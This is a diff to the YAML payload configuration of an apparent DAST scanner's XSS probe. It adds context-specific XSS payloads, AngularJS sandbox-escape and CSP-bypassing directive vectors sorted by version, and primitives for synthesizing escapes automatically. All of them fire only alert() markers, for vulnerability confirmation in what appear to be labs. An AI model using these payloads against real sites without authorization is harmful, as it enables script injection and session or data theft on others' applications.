@@ -57,3 +57,142 @@ payloads:
 
 # Confirmation marker injected into blind payloads — browser validator looks for this
 confirm_marker: "DAST_XSS_CONFIRM"
+
+# ── Deterministic xss_probe context library (read via get_value("xss", ...)) ──
+# The xss_probe tool self-detects the reflection CONTEXT (where the marker landed in the
+# rendered DOM) and picks the context-correct payload from here, delivering it through the
+# real agent browser and confirming strictly via a captured alert() dialog.
+#
+# {MARK} is a unique per-RUN numeric token the tool substitutes into every context_payloads
+# entry before delivery. CONFIRMED requires the captured dialog message to CONTAIN that exact
+# {MARK} value — a stray/ambient alert cannot satisfy it, so there are no false positives.
+# The *_quote_free sibling is selected when the app HTML-encodes quotes near the reflection
+# (so a payload that needs a raw " or ' would be neutralised); those vectors avoid quotes
+# entirely (String.fromCharCode / /XSS/.source).
+context_payloads:
+  html_body:
+    - '<img src=x onerror=alert({MARK})>'
+    - '<svg onload=alert({MARK})>'
+  attr_double_quote:
+    - '"><img src=x onerror=alert({MARK})>'
+    - '" autofocus onfocus=alert({MARK}) x="'
+  attr_single_quote:
+    - "'><img src=x onerror=alert({MARK})>"
+    - "' autofocus onfocus=alert({MARK}) x='"
+  js_string_double:
+    - '";alert({MARK})//'
+    - '</script><img src=x onerror=alert({MARK})>'
+  js_string_single:
+    - "';alert({MARK})//"
+  href_js:
+    - 'javascript:alert({MARK})'
+  html_body_quote_free:
+    - '<img src=x onerror=alert(String.fromCharCode(88))>'
+    - '<svg onload=alert(/XSS/.source)>'
+
+# AngularJS client-side template injection (CSTI) sandbox-escape vectors, keyed by the AngularJS
+# ERA detected on the page (1.2 / 1.3 / 1.4 / 1.5, and no_sandbox for 1.0-1.1 and 1.6+ where the
+# expression sandbox was absent or removed). These are FIXED published cheat-sheet forms that call
+# a literal alert(1) — the sandbox escape itself is structural and cannot be re-parameterised with
+# {MARK}, so the tool still confirms via a fired dialog whose message is "1". If a lab fails,
+# re-verify the vector against the current PortSwigger / AngularJS CSTI cheat sheet for that era.
+angular_csti:
+  no_sandbox:
+    - '{{constructor.constructor("alert(1)")()}}'
+  "1.2":
+    - '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}'
+  "1.3":
+    - '{{"a".constructor.prototype.charAt=[].join;$eval("x=alert(1)");}}'
+  "1.4":
+    - '{{a=toString().constructor.prototype;a.charAt=a.trim;$eval("a,alert(1),a")}}'
+  "1.5":
+    - "{{x={'y':''.constructor.prototype};x['y'].charAt=[].join;$eval('x=alert(1)');}}"
+
+# AngularJS CSTI variant for the "$parse of a param KEY" sandbox-escape — no string literal in the
+# injected payload (it builds "x=alert(1)" via fromCharCode on its char codes). The lab client does
+# `key=<paramName>; $scope.query[key]=<paramValue>; $scope.value=$parse(key)($scope.query)`, so the
+# param NAME is the Angular expression that gets evaluated. These vectors are therefore delivered by
+# xss_probe AS A QUERY-PARAM KEY, not a value (see _build_angular_key_url in xss_probe_tools.py):
+#   GET <path>?<injected_param>=1&<EXPR_AS_KEY>=1
+# The stored vector is the bare expression WITH its trailing `=1` (the KEY→value separator) but
+# WITHOUT the `<injected_param>=1&` prefix and WITHOUT %3d encoding. At delivery the tool prefixes
+# `<param>=1&` and percent-encodes every INTERNAL `=` (e.g. the `charAt=` assignment) to `%3d` so it
+# stays inside the KEY, keeping the final `=1` as the separator and everything else RAW. Fully
+# delivered, the "1.4" vector becomes:
+#   ?search=1&toString().constructor.prototype.charAt%3d[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1
+# Keyed by era like angular_csti. (Keep storing the bare expression; one entry serves both the
+# value-delivery $parse-sink path and the key-delivery path.)
+angular_no_strings:
+  "1.4":
+    - 'toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(120,61,97,108,101,114,116,40,49,41)=1'
+
+# Primitive building blocks for the DETERMINISTIC in-tool CSTI synthesizer
+# (dast/triage/xss_synthesis.py). These are the DECOMPOSED pieces of the full angular_csti /
+# angular_no_strings vectors above: instead of selecting a canned payload, xss_probe assembles the
+# sandbox escape from these primitives and verifies each piece against the live target's own
+# $parse/$eval (an oracle) before the terminal confirm — no LLM, no gateway. The curated full
+# payloads above stay as the fast first-attempt seed; synthesis is a fallback that runs only after
+# every curated candidate misses. KEEP these in sync with the full vectors (same grammar).
+#   string_builder   fromCharCode(<codes>) reached via toString().constructor → a string w/o literal
+#   charat_override  swaps String.prototype.charAt for Array.join (defeats the sandbox string check)
+#   orderby_trigger  evaluates {EXPR} as the orderBy predicate (reaches the sandboxed evaluator)
+#   function_ctor    Function-constructor code exec (no-sandbox eras 1.0-1.1 / 1.6+ only)
+#   effect_template  the assignment the orderBy trigger evaluates (x=<effect>)
+#   key_suffix       trailing KEY→value separator appended for query-param-KEY delivery
+angular_primitives:
+  string_builder: 'toString().constructor.fromCharCode'
+  charat_override: 'toString().constructor.prototype.charAt=[].join'
+  orderby_trigger: '[1]|orderBy:{EXPR}'
+  function_ctor: 'constructor.constructor({CODE})()'
+  effect_template: 'x={EFFECT}'
+  key_suffix: '=1'
+
+# AngularJS HTML-ELEMENT DIRECTIVE gadgets — CSTI that survives a script-src CSP (the
+# ``angular_html_injection`` context). When a page bootstraps ``ng-app`` on a subtree, a
+# server-reflected RAW-HTML value is ``$compile``'d on the next digest, so an injected element
+# carrying an Angular EVENT/INIT directive runs an Angular EXPRESSION (never inline JS → not blocked
+# by a ``script-src`` CSP or ``ng-csp``). TWO complementary triggers, each with its OWN escape:
+#   ng-focus  runs as a DOM event handler → it HAS ``$event``, so it reaches ``window`` via the
+#             QUOTE-FREE orderBy-over-``$event.composedPath()`` gadget (``composedPath()`` yields an
+#             array ending in ``window``; the ``orderBy`` string predicate is evaluated with each item
+#             as context, so ``'(z=alert)({MARK})'`` resolves ``window.alert`` and fires). It needs a
+#             focus event: ``autofocus`` triggers it for a real victim, and the tool layer focuses the
+#             element PROGRAMMATICALLY (autofocus does not reliably dispatch focus in a headless browser).
+#   ng-init   runs at LINK time, NOT as an event handler → it has NO ``$event`` (``$event.composedPath()``
+#             there THROWS and never fires). So it carries the EVENT-FREE no-strings escape instead,
+#             filled by the tool at ``{NGINIT}`` via ``xss_synthesis.ng_init_alert_expr(MARK)`` (the
+#             ``charAt``-override + ``orderBy``-of-``fromCharCode`` ``x=alert(MARK)`` escape). It
+#             auto-fires with ZERO interaction, so the tool tries it FIRST.
+# ``{NGINIT}`` is tool-filled (its fromCharCode codes depend on the per-run MARK, so it cannot be a
+# static template); the ``ng-focus`` seed is ``{MARK}``-substituted so the dialog echoes the per-run
+# MARK (no false positives). Keyed by AngularJS era like ``angular_csti``. If a lab fails, re-verify
+# the ng-focus gadget against the current PortSwigger "AngularJS sandbox escape and CSP" cheat sheet
+# (``composedPath`` vs ``path`` drifts with the Chromium build).
+angular_html_directive:
+  "1.4":
+    - '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:''(z=alert)({MARK})''">'
+    - '<input id=x ng-init="{NGINIT}">'
+  "1.5":
+    - '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:''(z=alert)({MARK})''">'
+    - '<input id=x ng-init="{NGINIT}">'
+  no_sandbox:
+    - '<input id=x autofocus ng-focus="$event.composedPath()|orderBy:''(z=alert)({MARK})''">'
+    - '<input id=x ng-init="{NGINIT}">'
+
+# Primitive building blocks for the DETERMINISTIC in-tool synthesizer of the Angular HTML-directive
+# gadget (dast/triage/xss_synthesis.py ``_synthesize_angular_html``). Decomposed pieces of the full
+# ``angular_html_directive`` vectors above: synthesis delivers the ``*_seed`` carrying the orderBy
+# gadget and PROVES, via two live oracles, that the injected element compiled + its directive fired
+# (the ``orderby_setter`` writes a window sentinel it reads back) and that the ``orderBy``/``(z=alert)``
+# call is not sandbox-blocked, before composing the terminal ``alert({MARK})``. KEEP in sync with the
+# full vectors (same grammar). ``{EXPR}`` = the gadget expression, ``{ARG}`` = alert argument,
+# ``{VAL}`` = the numeric window-name sentinel value.
+#   element_seed     the auto-firing element (autofocus → ng-focus) the gadget rides in
+#   ng_init_seed     link-time fallback trigger (no user interaction)
+#   orderby_alert    the quote-free orderBy/composedPath gadget firing alert({ARG})
+#   orderby_setter   benign sibling: sets window.name={VAL} via the same escape (the compile/fire oracle)
+angular_html_primitives:
+  element_seed: '<input id=x autofocus ng-focus="{EXPR}">'
+  ng_init_seed: '<input id=x ng-init="{EXPR}">'
+  orderby_alert: '$event.composedPath()|orderBy:''(z=alert)({ARG})'''
+  orderby_setter: '$event.composedPath()|orderBy:''(z=(name={VAL}))'''
